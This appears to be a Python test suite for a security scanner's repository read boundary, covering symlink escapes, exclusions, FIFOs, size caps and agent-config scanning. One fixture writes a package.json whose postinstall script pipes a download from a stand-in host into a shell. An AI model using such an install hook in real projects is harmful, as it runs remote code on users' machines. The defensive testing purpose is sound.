"""Synthetic regressions for the shared repository read boundary."""
from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from websec_validator.extractors.agent_config import AgentConfigExtractor
from websec_validator.extractors.base import SKIP_DIRS, RepoContext
from websec_validator.extractors.dependencies import DependenciesExtractor


class ReadBoundaryTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name).resolve()
        self.repo = self.base / "repo"
        self.repo.mkdir()

    def write(self, name, content="SYNTHETIC_SOURCE = True", *, root=None):
        path = (root or self.repo) / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
        return path

    def test_ordinary_source_and_root_manifest_are_available(self):
        source = self.write("app.py")
        package = self.write("package.json", '{"name":"synthetic"}')
        ctx = RepoContext(self.repo)
        self.assertEqual(ctx.code_files, [source])
        self.assertEqual(ctx.text(source), "SYNTHETIC_SOURCE = True")
        self.assertEqual(ctx.text(Path("app.py")), ctx.text(source))
        self.assertEqual(ctx.manifest("package.json"), package.read_text())
        self.assertEqual(ctx.glob("**/package.json"), [package])
        self.assertTrue(ctx.exists("package.json"))

    def test_external_paths_and_file_symlinks_are_rejected_by_every_api(self):
        outside = self.write("outside.py", root=self.base)
        alias = self.repo / "alias.py"
        alias.symlink_to(outside)
        ctx = RepoContext(self.repo)
        self.assertEqual(ctx.code_files, [])
        self.assertEqual(ctx.glob("*.py"), [])
        self.assertEqual(ctx.text(outside), "")
        self.assertEqual(ctx.text(alias), "")
        self.assertEqual(ctx.manifest("../outside.py"), "")
        self.assertFalse(ctx.exists("alias.py", "../outside.py", str(outside)))
        self.assertGreater(ctx.skip_counts["outside_root"], 0)

    def test_safe_in_root_file_symlink_is_read(self):
        source = self.write("source.py")
        alias = self.repo / "alias.py"
        alias.symlink_to(source)
        ctx = RepoContext(self.repo)
        self.assertEqual(set(ctx.code_files), {source, alias})
        self.assertEqual(ctx.text(alias), "SYNTHETIC_SOURCE = True")
        self.assertTrue(ctx.exists("alias.py"))

    def test_selected_root_may_itself_have_a_symlink_spelling(self):
        self.write("source.py")
        alias = self.base / "root-alias"
        alias.symlink_to(self.repo, target_is_directory=True)
        ctx = RepoContext(alias)
        self.assertEqual(ctx.code_files, [alias / "source.py"])
        self.assertEqual(ctx.text(alias / "source.py"), "SYNTHETIC_SOURCE = True")

    def test_authorized_root_identity_accepts_unchanged_root(self):
        source = self.write("source.py")
        info = self.repo.stat()
        ctx = RepoContext(self.repo, expected_root=(self.repo, info.st_dev, info.st_ino))
        self.assertEqual(ctx.code_files, [source])
        self.assertEqual(ctx.text(source), "SYNTHETIC_SOURCE = True")

    def test_authorized_root_identity_rejects_replacement_before_walk(self):
        info = self.repo.stat()
        expected = (self.repo, info.st_dev, info.st_ino)
        self.repo.rename(self.base / "original")
        self.repo.mkdir()
        self.write("replacement.py")
        with patch.object(RepoContext, "_walk", side_effect=AssertionError("must not enumerate")):
            with self.assertRaisesRegex(ValueError, "root changed after authorization"):
                RepoContext(self.repo, expected_root=expected)

    def test_authorized_root_path_rejects_moved_directory_with_same_inode(self):
        info = self.repo.stat()
        expected = (self.repo, info.st_dev, info.st_ino)
        moved = self.base / "outside"
        self.repo.rename(moved)
        self.repo.symlink_to(moved, target_is_directory=True)
        self.assertEqual(self.repo.stat().st_ino, info.st_ino)
        with patch.object(RepoContext, "_walk", side_effect=AssertionError("must not enumerate")):
            with self.assertRaisesRegex(ValueError, "root changed after authorization"):
                RepoContext(self.repo, expected_root=expected)

    def test_directory_symlinks_are_not_traversed(self):
        source = self.write("src/source.py")
        (self.repo / "alias").symlink_to(source.parent, target_is_directory=True)
        outside = self.write("elsewhere/secret.py", root=self.base)
        (self.repo / "outside").symlink_to(outside.parent, target_is_directory=True)
        ctx = RepoContext(self.repo)
        self.assertEqual(ctx.code_files, [source])
        self.assertEqual(ctx.text(self.repo / "outside/secret.py"), "")

    def test_symlink_cannot_alias_excluded_or_private_content(self):
        for directory in ("omit", ".local"):
            source = self.write(f"{directory}/source.py")
            (self.repo / f"{directory.strip('.')}_alias.py").symlink_to(source)
        ctx = RepoContext(self.repo, excludes=["omit"])
        self.assertEqual(ctx.code_files, [])
        self.assertEqual(ctx.glob("*.py"), [])
        self.assertEqual(ctx.text(self.repo / "local_alias.py"), "")
        self.assertEqual(ctx.text(self.repo / "omit_alias.py"), "")
        self.assertFalse(ctx.exists(".local/source.py", "local_alias.py", "omit/source.py"))

    def test_exclusions_cover_code_text_manifest_glob_and_exists(self):
        source = self.write("omit/source.py")
        self.write("omit/package.json", json.dumps({"scripts": {
            "postinstall": "curl https://example.invalid/setup.sh | sh"}}))
        ctx = RepoContext(self.repo, excludes=["omit/**"])
        self.assertEqual(ctx.code_files, [])
        self.assertEqual(ctx.text(source), "")
        self.assertEqual(ctx.manifest("omit/package.json"), "")
        self.assertEqual(ctx.glob("**/package.json"), [])
        self.assertFalse(ctx.exists("omit/package.json"))
        self.assertEqual(DependenciesExtractor().extract(ctx, {})["counts"]["install_scripts"], 0)

    def test_excluded_alias_to_allowed_file_is_rejected(self):
        source = self.write("source.py")
        alias = self.repo / "omit.py"
        alias.symlink_to(source)
        ctx = RepoContext(self.repo, excludes=["omit.py"])
        self.assertEqual(ctx.code_files, [source])
        self.assertEqual(ctx.text(alias), "")

    def test_private_and_skip_directories_are_pruned_before_enumeration(self):
        for directory in (".local", "node_modules", ".git"):
            self.write(f"{directory}/nested/source.py")
        source = self.write("source.py")
        scanned = []
        original = os.scandir

        def observe(path):
            scanned.append(Path(path))
            return original(path)

        with patch("websec_validator.extractors.base.os.scandir", side_effect=observe):
            ctx = RepoContext(self.repo)
        self.assertEqual(scanned, [self.repo])
        self.assertEqual(ctx.code_files, [source])
        self.assertEqual(ctx.text(self.repo / ".local/nested/source.py"), "")
        self.assertEqual(ctx.manifest(".local/nested/source.py"), "")

    def test_every_agent_tooling_directory_is_pruned(self):
        # Agent scaffolding is not the target app: its configs and skill files are
        # generated prompts/hooks, so scanning them invents findings that belong to
        # the developer's tooling rather than the product. `.codex/` was missed when
        # the rest of the family was added, so assert the whole family at once —
        # a new sibling added to the set must be added here too.
        family = (".wolf", ".claude", ".agent", ".agents", ".codex", ".local")
        for directory in family:
            self.write(f"{directory}/nested/tooling.py")
        source = self.write("app.py")
        ctx = RepoContext(self.repo)
        self.assertEqual(ctx.code_files, [source])
        for directory in family:
            self.assertIn(directory, SKIP_DIRS, f"{directory} must be pruned")
        # Pruning governs ENUMERATION only. An extractor may still read one of these
        # by explicit path — agent_config deliberately reads `.claude/.mcp.json` — so
        # do not assert unreadability here. `.local` is the private exception and is
        # blocked even on an explicit read; that contract is covered by
        # test_private_and_skip_directories_are_pruned_before_enumeration.
        self.assertEqual(ctx.text(self.repo / ".local/nested/tooling.py"), "")

    def test_skip_named_ancestor_does_not_hide_project(self):
        nested = self.base / "vendor" / ".local" / "actual-project"
        nested.mkdir(parents=True)
        source = self.write("source.py", root=nested)
        ctx = RepoContext(nested)
        self.assertEqual(ctx.code_files, [source])
        self.assertEqual(ctx.text(source), "SYNTHETIC_SOURCE = True")

    @unittest.skipUnless(hasattr(os, "mkfifo"), "requires FIFO support")
    def test_fifo_is_not_walked_opened_or_reported_as_existing_file(self):
        fifo = self.repo / "pipe.py"
        os.mkfifo(fifo)
        ctx = RepoContext(self.repo)
        with patch.object(ctx, "_open_file", side_effect=AssertionError("must not open FIFO")):
            self.assertEqual(ctx.text(fifo), "")
            self.assertEqual(ctx.manifest("pipe.py"), "")
        self.assertEqual(ctx.code_files, [])
        self.assertEqual(ctx.glob("*.py"), [])
        self.assertFalse(ctx.exists("pipe.py"))
        self.assertEqual(ctx.skip_counts["non_regular"], 1)

    def test_symlink_loop_degrades_without_crashing(self):
        (self.repo / "loop.py").symlink_to(self.repo / "loop.py")
        ctx = RepoContext(self.repo)
        self.assertEqual(ctx.code_files, [])
        self.assertEqual(ctx.text(self.repo / "loop.py"), "")
        self.assertEqual(ctx.unreadable, ["loop.py"])

    def test_byte_cap_applies_to_manifests_and_custom_readers(self):
        path = self.write("package.json", "a" * 20)
        ctx = RepoContext(self.repo)
        with patch("websec_validator.extractors.base.MAX_BYTES", 10):
            self.assertEqual(ctx.manifest("package.json"), "")
            self.assertEqual(ctx.text(path, max_bytes=100), "")
        self.assertEqual(ctx.oversized, ["package.json"])
        small = self.write("small.json", "a" * 4)
        self.assertEqual(ctx.text(small, max_bytes=3), "")
        self.assertEqual(ctx.text(small, max_bytes=4), "aaaa")

    def test_growing_file_read_remains_bounded(self):
        path = self.write("source.py", "small")
        ctx = RepoContext(self.repo)
        original = ctx._open_file

        def grow(resolved, expected):
            path.write_text("x" * 100)
            return original(resolved, expected)

        with patch.object(ctx, "_open_file", side_effect=grow):
            self.assertEqual(ctx.text(path, max_bytes=10), "")
        self.assertEqual(ctx.oversized, ["source.py"])

    def test_unreadable_files_are_disclosed_and_do_not_crash(self):
        source = self.write("source.py")
        ctx = RepoContext(self.repo)
        with patch.object(ctx, "_open_file", side_effect=PermissionError("synthetic denied")):
            self.assertEqual(ctx.text(source), "")
        self.assertEqual(ctx.unreadable, ["source.py"])
        self.assertEqual(ctx.skip_counts["unreadable"], 1)

    def test_code_and_inventory_caps_are_disclosed(self):
        for name in ("a.py", "b.py", "c.py"):
            self.write(name)
        self.write("package.json", "{}")
        with patch("websec_validator.extractors.base.MAX_FILES", 2):
            ctx = RepoContext(self.repo)
        self.assertEqual([p.name for p in ctx.code_files], ["a.py", "b.py"])
        self.assertTrue(ctx.truncated)
        self.assertEqual(len(ctx.glob("package.json")), 1)
        with patch("websec_validator.extractors.base.MAX_WALK_FILES", 2):
            ctx = RepoContext(self.repo)
        self.assertTrue(ctx.walk_truncated)
        self.assertTrue(ctx.truncated)

    def test_globs_support_zero_many_directories_and_existence_caps(self):
        paths = [self.write(name, "{}") for name in (
            "package.json", "apps/one/package.json", "apps/two/deep/package.json")]
        ctx = RepoContext(self.repo)
        self.assertEqual(set(ctx.glob("**/package.json")), set(paths))
        self.assertEqual(set(ctx.glob("apps/**/package.json")), set(paths[1:]))
        self.assertEqual(ctx.glob("apps/*/package.json"), [paths[1]])
        self.assertEqual(len(ctx.glob("package.json", 1)), 1)
        self.assertEqual(ctx.glob_truncated, [])
        self.assertEqual(len(ctx.glob("package.json", 2)), 2)
        self.assertEqual(ctx.glob_truncated, [{"pattern": "package.json", "limit": 2}])
        self.assertEqual(ctx.glob("package.json", 0), [])

    def test_known_unsupported_source_types_are_disclosed(self):
        self.write("server.scala", "object Server")
        self.write("README.md", "documentation")
        ctx = RepoContext(self.repo)
        self.assertEqual(ctx.unsupported_files, ["server.scala"])
        self.assertEqual(ctx.file_types, {".md": 1, ".scala": 1})

    def test_agent_config_is_explicitly_read_but_obeys_exclusions(self):
        config = {"enableAllProjectMcpServers": True}
        self.write(".claude/settings.json", json.dumps(config))
        ctx = RepoContext(self.repo)
        self.assertEqual(ctx.glob("**/settings.json"), [])
        facts = AgentConfigExtractor().extract(ctx, {})
        self.assertIn(".claude/settings.json", facts["files_scanned"])
        self.assertTrue(any(f["kind"] == "mcp-autoapprove" for f in facts["findings"]))
        excluded = AgentConfigExtractor().extract(RepoContext(self.repo, excludes=[".claude"]), {})
        self.assertNotIn(".claude/settings.json", excluded["files_scanned"])
        self.assertEqual(excluded["findings"], [])

    def test_agent_config_cannot_read_external_symlink(self):
        config = self.write("outside.json", '{"enableAllProjectMcpServers":true}', root=self.base)
        (self.repo / ".mcp.json").symlink_to(config)
        facts = AgentConfigExtractor().extract(RepoContext(self.repo), {})
        self.assertEqual(facts["files_scanned"], [])
        self.assertEqual(facts["findings"], [])

    def test_cursor_rules_root_and_nested_rules_are_read_with_exact_cap(self):
        self.write(".cursor/rules/root.mdc", "rule")
        self.write(".cursor/rules/nested/child.md", "rule")
        self.write(".cursor/rules/nested/third.txt", "rule")
        ctx = RepoContext(self.repo)
        with patch("websec_validator.extractors.agent_config._MAX_CURSOR_RULES", 2):
            facts = AgentConfigExtractor().extract(ctx, {})
        self.assertEqual(len(facts["files_scanned"]), 2)
        self.assertTrue(ctx.glob_truncated)

    def test_cursor_rule_suffixes_remain_case_insensitive(self):
        paths = [".cursor/rules/SECURITY.MDC", ".cursor/rules/nested/POLICY.MD",
                 ".cursor/rules/nested/REVIEW.TXT", ".cursor/rules/mixed.MdC"]
        for path in paths:
            self.write(path, "synthetic rule")
        facts = AgentConfigExtractor().extract(RepoContext(self.repo), {})
        self.assertEqual(set(facts["files_scanned"]), set(paths))

    @unittest.skipUnless(os.open in os.supports_dir_fd and hasattr(os, "O_NOFOLLOW"),
                         "requires anchored no-follow open")
    def test_parent_symlink_swap_between_validation_and_open_is_rejected(self):
        source = self.write("src/source.py", "inside")
        self.write("outside/source.py", "SYNTHETIC_OUTSIDE", root=self.base)
        ctx = RepoContext(self.repo)
        original = ctx._open_file

        def swap(resolved, expected):
            source.parent.rename(self.repo / "original-src")
            (self.repo / "src").symlink_to(self.base / "outside", target_is_directory=True)
            return original(resolved, expected)

        with patch.object(ctx, "_open_file", side_effect=swap):
            self.assertEqual(ctx.text(source), "")
        self.assertEqual(ctx.unreadable, ["src/source.py"])


if __name__ == "__main__":
    unittest.main()
